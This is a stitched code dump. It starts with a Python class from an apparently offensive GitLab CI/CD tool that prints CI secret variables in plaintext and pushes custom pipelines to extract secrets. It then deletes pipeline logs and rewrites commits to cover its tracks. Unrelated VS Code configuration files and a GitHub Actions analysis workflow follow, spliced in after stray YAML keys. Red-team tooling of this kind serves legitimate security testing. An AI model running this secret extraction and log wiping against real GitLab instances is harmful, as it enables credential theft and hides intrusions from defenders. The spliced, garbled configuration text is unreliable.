        if group:
            if exists(group):
                with open(group, "r") as file:
                    for p in file:
                        self._cicd.addGroups(group)

            else:
                self._cicd.addGroups(group)
        else:
            self._cicd.addGroups()

        if len(self._cicd.groups) == 0:
            logger.critical("No group found.")

    def listGitLabSecrets(self):
        logger.info("Listing GitLab secrets")

        res = False
        if self._extractInstance:
            res |= self.__listGitLabInstanceSecrets()

        if self._extractGroup:
            res |= self.__listGitLabGroupSecrets()

        if self._extractProject:
            res |= self.__listGitLabProjectSecrets()
            res |= self.__listGitLabProjectSecureFiles()

        if not res:
            logger.warning(
                "You don't have access to any secret, try to deploy a pipeline and exfiltrate environment variables"
            )

    def __listGitLabProjectSecrets(self):
        res = False
        for project in self._cicd.projects:
            try:
                res |= self.__displayProjectVariables(project)
            except Exception as e:
                logger.error(f"Error while listing secrets for {project.get('name')}: {e}")
        return res

    def __listGitLabProjectSecureFiles(self):
        res = False
        for project in self._cicd.projects:
            try:
                res |= self.__displayProjectSecureFiles(project)
            except Exception as e:
                logger.error(f"Error while listing secure files for {project.get('name')}: {e}")
        return res

    def __listGitLabGroupSecrets(self):
        res = False
        for group in self._cicd.groups:
            try:
                res |= self.__displayGroupVariables(group)
            except Exception as e:
                logger.error(f"Error while listing secrets for {group.get('name')}: {e}")
        return res

    def __listGitLabInstanceSecrets(self):
        try:
            return self.__displayInstanceVariables()
        except Exception as e:
            logger.error(f"Error while listing instance secrets: {e}")
            return False

    def __displayProjectVariables(self, project):

        projectName = project.get("path_with_namespace")

        try:
            variables = self._cicd.listVariablesFromProject(project)
            if len(variables) != 0:

                logger.info(f'"{projectName}" project variables')

                for variable in variables:
                    logger.raw(
                        f'\t- {variable["key"]}={variable["value"]} (protected:{variable["protected"]})\n', logging.INFO
                    )
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info(f'"{projectName}" variables')
                logger.error(f"\t{e}")
        return False

    def __displayProjectSecureFiles(self, project):

        projectName = project.get("path_with_namespace")

        try:
            secFiles = self._cicd.listSecureFilesFromProject(project)
            if len(secFiles) != 0:

                logger.info(f'"{projectName}" secure files')

                for file in secFiles:
                    logger.raw(f'\t- {file["name"]} ({file["path"]})\n', logging.INFO)
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info(f'"{projectName}" secure files')
                logger.error(f"\t{e}")
        return False

    def __displayGroupVariables(self, group):

        groupPath = group.get("full_path")

        try:
            variables = self._cicd.listVariablesFromGroup(group)
            if len(variables) != 0:
                logger.info(f'"{groupPath}" group variables:')

                for variable in variables:
                    logger.raw(
                        f'\t- {variable["key"]}={variable["value"]} (protected:{variable["protected"]})\n', logging.INFO
                    )
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info(f'"{groupPath}" group variables:')
                logger.error(f"\t{e}")
        return False

    def __displayInstanceVariables(self):
        try:
            variables = self._cicd.listVariablesFromInstance()
            if len(variables) != 0:
                logger.info("Instance variables:")
                for variable in variables:
                    logger.raw(
                        f'\t- {variable["key"]}={variable["value"]} (protected:{variable["protected"]})\n', logging.INFO
                    )
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info("Instance variables:")
                logger.error(f"\t{e}")
        return False

    def listGitLabProjects(self):
        logger.info("Listing GitLab projects")
        for project in self._cicd.projects:

            repoPath = project.get("path")
            repoName = project.get("name")

            if repoPath != repoName:
                logger.raw(f'- {project["path_with_namespace"]} ({repoName})\n', level=logging.INFO)
            else:
                logger.raw(f'- {project["path_with_namespace"]}\n', level=logging.INFO)

    def listGitLabGroups(self):
        logger.info("Listing GitLab groups")
        for project in self._cicd.groups:
            logger.raw(f'- {project["full_path"]}\n', level=logging.INFO)

    def runPipeline(self):
        for project in self._cicd.projects:

            repoPath = project.get("path")
            repoName = project.get("name")

            if repoPath != repoName:
                logger.success(f'"{repoName}" ({repoPath})')
            else:
                logger.success(f'"{repoName}"')

            domain = urlparse(self._cicd.url).netloc
            if self._cicd.url.startswith("https"):
                handler = "https"
            else:
                handler = "http"

            url = f"{handler}://foo:{self._cicd.token}@{domain}/{project.get('path_with_namespace')}"
            Git.gitClone(url)

            chdir(repoPath)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
            Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                # TODO: branch protections
                # if not self._forceDeploy:
                #    self.__checkAndDisableBranchProtectionRules(repo)

                if self._yaml:
                    self.__runCustomPipeline(project)
                else:
                    logger.error("No yaml specify")

            except KeyboardInterrupt:
                pass

            except Exception as e:
                logger.error(f"Error: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

            finally:
                self.__clean(project)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoPath}", shell=True).wait()

        logger.info(f"Check output: {self._cicd.outputDir}")

    def __runCustomPipeline(self, project):
        logger.info(f"Running custom pipeline: {self._yaml}")

        pipelineGenerator = GitLabPipelineGenerator()
        pipelineGenerator.loadFile(self._yaml)

        try:
            pipelineId = self.__launchPipeline(project, pipelineGenerator)
            if pipelineId:
                self._fileName = self._cicd.downloadPipelineOutput(project, pipelineId)
                if self._fileName:
                    self.__extractPipelineOutput(project)
                    logger.empty_line()
        except Exception as e:
            logger.error(f"Error: {e}")

        finally:
            logger.empty_line()

    def __launchPipeline(self, project, pipelineGenerator):
        logger.verbose(f"Launching pipeline.")

        projectId = project.get("id")

        pipelineGenerator.writeFile(f".gitlab-ci.yml")
        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
                logger.error("Error when pushing code: Everything up-to-date")
                logger.warning(
                    "Your trying to push the same code on an existing branch, modify the yaml file to push it."
                )

            elif pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)

            else:
                self._pushedCommitsCount += 1
                logger.raw(pushOutput.communicate()[1])

                pipelineId, pipelineStatus = self._cicd.waitPipeline(projectId)

                if pipelineStatus == "success":
                    logger.success("Pipeline has successfully terminated.")
                    return pipelineId

                elif pipelineStatus == "failed":
                    self.__displayFailureReasons(projectId, pipelineId)

                return pipelineId

        except Exception as e:
            logger.exception(e)
        finally:
            pass

    def __extractPipelineOutput(self, project, resultsFilename="secrets.txt"):

        projectPath = project.get("path_with_namespace")

        with open(
            f"{self._cicd.outputDir}/{projectPath}/{self._fileName}",
            "rb",
        ) as output:

            pipelineResults = output.read()

        logger.success("Output:")
        logger.raw(pipelineResults, logging.INFO)

    def __clean(self, project):

        if self._pushedCommitsCount > 0:

            projectId = project.get("id")
            if self._cleanLogs:
                logger.info(f"Cleaning logs for project: {project.get('path_with_namespace')}")
                self._cicd.cleanAllLogs(projectId)

            logger.verbose("Cleaning commits.")
            if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
            else:
                if not self.__deleteRemoteBranch():
                    logger.info("Cleaning remote branch.")
                    # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                    Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for project in self._cicd.projects:
            logger.info(f"Cleaning logs for project: {project.get('path_with_namespace')}")
            self._cicd.cleanAllLogs(project.get("id"))

    def __deleteRemoteBranch(self):
        logger.verbose("Deleting remote branch")
        deleteOutput = Git.gitDeleteRemote(self._cicd.branchName)
        deleteOutput.wait()

        if deleteOutput.returncode != 0:
            logger.error(f"Error deleting remote branch {self._cicd.branchName}")
            logger.raw(deleteOutput.communicate()[1], logging.INFO)
            return False
        return True

    def describeToken(self):
        response = self._cicd.getUser()
        logger.info("Token information:")

        username = response.get("username")
        if username != "":
            logger.raw(f"\t- Username: {username}\n", logging.INFO)

        isAdmin = response.get("is_admin")
        if isAdmin == None:
            logger.raw(f"\t- IsAdmin: False\n", logging.INFO)
        else:
            logger.raw(f"\t- IsAdmin: {isAdmin}\n", logging.INFO)

        email = response.get("email")
        if email != "":
            logger.raw(f"\t- Email: {email}\n", logging.INFO)

        id = response.get("id")
        if id != "":
            logger.raw(f"\t- Id: {id}\n", logging.INFO)

        note = response.get("note")
        if note != "" and note != None:
            logger.raw(f"\t- Note: {note}\n", logging.INFO)

    def listBranchesProtectionRules(self):
        logger.info("Listing branch protection rules.")
        for project in self._cicd.projects:

            projectName = project.get("path_with_namespace")
            logger.info(f"{projectName}:")

            try:
                protections = self._cicd.getBranchesProtectionRules(project.get("id"))
                self.__displayBranchesProtectionRulesPriv(protections)
            except GitLabError as e:
                logger.verbose(
                    "Not enough privileges to get full details on the branch protection rules for this project, trying to get limited information."
                )
                try:
                    branches = self._cicd.getBranches(project.get("id"))
                    self.__displayBranchesProtectionRulesUnpriv(branches)
                except GitLabError as e:
                    logger.error(f"\t{e}")

            logger.empty_line()

    def __displayBranchesProtectionRulesPriv(self, protections):
        if len(protections) == 0:
            logger.success(f"No protection")

        for protection in protections:

            name = protection.get("name")
            logger.info(f'branch: "{name}"')

            allow_force_push = protection.get("allow_force_push")
            logger.raw(f"\t- Allow force push: {allow_force_push}\n", logging.INFO)

            code_owner_approval_required = protection.get("code_owner_approval_required", None)
            if code_owner_approval_required != None:
                logger.raw(f"\t- Code Owner approval required: {code_owner_approval_required}\n", logging.INFO)

            push_access_levels = protection.get("push_access_levels", [])
            logger.raw(f"\t- Push access level:\n", logging.INFO)
            self.__displayAccessLevel(push_access_levels)

            unprotect_access_levels = protection.get("unprotect_access_levels", [])
            logger.raw(f"\t- Unprotect access level:\n", logging.INFO)
            self.__displayAccessLevel(unprotect_access_levels)

            merge_access_levels = protection.get("merge_access_levels", [])
            logger.raw(f"\t- Merge access level:\n", logging.INFO)
            self.__displayAccessLevel(merge_access_levels)

    def __displayBranchesProtectionRulesUnpriv(self, branches):

        for branch in branches:

            isProtected = branch.get("protected")
            if isProtected:

                name = branch.get("name")
                logger.info(f'branch: "{name}"')

                logger.raw(f"\t- Protected: True\n", logging.INFO)

                developers_can_push = branch.get("developers_can_push")
                logger.raw(f"\t- Developers can push: {developers_can_push}\n", logging.INFO)

                developers_can_merge = branch.get("developers_can_merge")
                logger.raw(f"\t- Developers can merge: {developers_can_merge}\n", logging.INFO)

    def __displayAccessLevel(self, access_levels):
        for al in access_levels:
            access_level = al.get("access_level", None)
            user_id = al.get("user_id", None)
            group_id = al.get("group_id", None)
            access_level_description = al.get("access_level_description")

            res = f"\t\t{access_level_description}"

            if access_level != None:
                res += f" (access_level={access_level})"
            if user_id != None:
                res += f" (user_id={user_id})"
            if group_id != None:
                res += f" (group_id={group_id})"

            logger.raw(f"{res}\n", logging.INFO)

    def __displayFailureReasons(self, projectId, pipelineId):
        logger.error("Pipeline has failed.")

        pipelineFailure = self._cicd.getFailureReasonPipeline(projectId, pipelineId)
        if pipelineFailure:
            logger.error(f"{pipelineFailure}")
        else:
            jobsFailure = self._cicd.getFailureReasonJobs(projectId, pipelineId)

            for failure in jobsFailure:

                name = failure["name"]
                stage = failure["stage"]
                reason = failure["failure_reason"]

                logger.raw(f"\t- {name}: {reason} (stage={stage})\n", logging.INFO)
      contents: // A launch configuration that compiles the extension and then opens it inside a new window
// Use IntelliSense to learn about possible attributes.
// Hover to view descriptions of existing attributes.
// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Debug Jest Tests",
      "type": "extensionHost",
      "request": "launch",
      "args": [
        "${workspaceFolder}/packages/foam-vscode/.test-workspace",
        "--disable-extensions",
        "--disable-workspace-trust",
        "--extensionDevelopmentPath=${workspaceFolder}/packages/foam-vscode",
        "--extensionTestsPath=${workspaceFolder}/packages/foam-vscode/out/test/suite"
      ],
      "outFiles": [
        "${workspaceFolder}/packages/foam-vscode/out/**/*.js"
      ],
      "preLaunchTask": "${defaultBuildTask}"
    },
    {
      "name": "Run VSCode Extension",
      "type": "extensionHost",
      "request": "launch",
      "runtimeExecutable": "${execPath}",
      "args": [
        "--extensionDevelopmentPath=${workspaceFolder}/packages/foam-vscode"
      ],
      "outFiles": [
        "${workspaceFolder}/packages/foam-vscode/out/**/*.js"
      ],
      "preLaunchTask": "${defaultBuildTask}"
    },
    {
      "type": "node",
      "name": "vscode-jest-tests",
      "request": "launch",
      "console": "integratedTerminal",
      "internalConsoleOptions": "neverOpen",
      "disableOptimisticBPs": true,
      "cwd": "${workspaceFolder}/packages/foam-vscode",
      "runtimeExecutable": "yarn",
      "args": [
        "jest",
        "--runInBand",
        "--watchAll=false"
      ]
    }
  ]
}
      security-events: // Place your settings in this file to overwrite default and user settings.
{
  "files.exclude": {
    // set these to true to hide folders with the compiled JS files,
    "packages/**/out": false,
    "packages/**/dist": false
  },
  "search.exclude": {
    // set this to false to include compiled JS folders in search results
    "packages/**/out": true,
    "packages/**/dist": true
  },
  // Turn off tsc task auto detection since we have the necessary tasks as npm scripts
  "typescript.tsc.autoDetect": "off",
  "foam.edit.linkReferenceDefinitions": "withExtensions",
  "foam.files.ignore": [
    "**/.vscode/**/*",
    "**/_layouts/**/*",
    "**/_site/**/*",
    "**/node_modules/**/*",
    "packages/**/*"
  ],
  "editor.tabSize": 2,
  "editor.formatOnSave": true,
  "editor.formatOnSaveMode": "file",
  "editor.defaultFormatter": "esbenp.prettier-vscode",
  "jest.autoRun": "off",
  "jest.rootPath": "packages/foam-vscode",
  "jest.jestCommandLine": "yarn jest",
  "gitdoc.enabled": false,
  "search.mode": "reuseEditor",
  "[typescript]": {
    "editor.defaultFormatter": "esbenp.prettier-vscode"
  }
}
      actions: // See https://go.microsoft.com/fwlink/?LinkId=733558
// for the documentation about the tasks.json format
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "watch: foam-vscode",
      "type": "npm",
      "script": "watch",
      "problemMatcher": "$tsc-watch",
      "isBackground": true,
      "presentation": {
        "reveal": "always"
      },
      "group": {
        "kind": "build",
        "isDefault": true
      }
    },
    {
      "label": "test: all packages",
      "type": "npm",
      "script": "test",
      "problemMatcher": [],
      "group": {
        "kind": "test",
        "isDefault": true
      }
    }
  ]
}
    name: Analyze
    runs-on: windows-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Configure CMake
        run: cmake -B ${{ env.build }}

      # Build is not required unless generated source files are used
      # - name: Build CMake
      #   run: cmake --build ${{ env.build }}

      - name: Initialize MSVC Code Analysis
        uses: microsoft/msvc-code-analysis-action@04825f6d9e00f87422d6bf04e1a38b1f3ed60d99
        # Provide a unique ID to access the sarif output path
        id: run-analysis
        with:
          cmakeBuildDirectory: ${{ env.build }}
          # Ruleset file that will determine what checks will be run
          ruleset: NativeRecommendedRules.ruleset

      # Upload SARIF file to GitHub Code Scanning Alerts
      - name: Upload SARIF to GitHub
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: ${{ steps.run-analysis.outputs.sarif }}

      # Upload SARIF file as an Artifact to download and view
      # - name: Upload SARIF as an Artifact
      #   uses: actions/upload-artifact@v3
      #   with:
      #     name: sarif-file
      #     path: ${{ steps.run-analysis.outputs.sarif }}
